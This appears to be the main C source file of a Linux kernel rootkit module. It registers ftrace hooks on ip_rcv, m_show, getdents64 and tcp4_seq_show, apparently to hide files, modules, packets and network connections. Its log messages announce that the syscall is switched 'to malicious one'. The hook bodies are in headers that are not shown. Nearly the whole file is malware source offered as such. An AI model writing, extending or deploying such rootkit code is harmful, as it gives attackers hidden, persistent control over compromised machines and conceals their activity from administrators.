#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>


#include "hooks.h"
#include "ftrace_helper2.h"





static struct ftrace_hook hooks[] = {
 	HOOK("ip_rcv", new_ip_rcv, &old_ip_rcv),
 	HOOK("m_show", new_m_show, &old_m_show),
 	HOOK("__x64_sys_getdents64", new_getdents64, &old_getdents64),
 	HOOK("tcp4_seq_show", new_tcp4_seq_show, &old_tcp4_seq_show),
 };



static int __init rootkit_enter(void) {


	printk(KERN_INFO "rootkit is operating\n");

	unsigned int err;

	printk(KERN_INFO "rootkit is operating\n");
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));

	if(err)
		return err;

	printk(KERN_INFO "switched getdents64 syscall to malicious one\n");

	return 0;
}




static void __exit rootkit_exit(void) {

	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "rootkit stopped\n");
}




module_init(rootkit_enter);
module_exit(rootkit_exit);
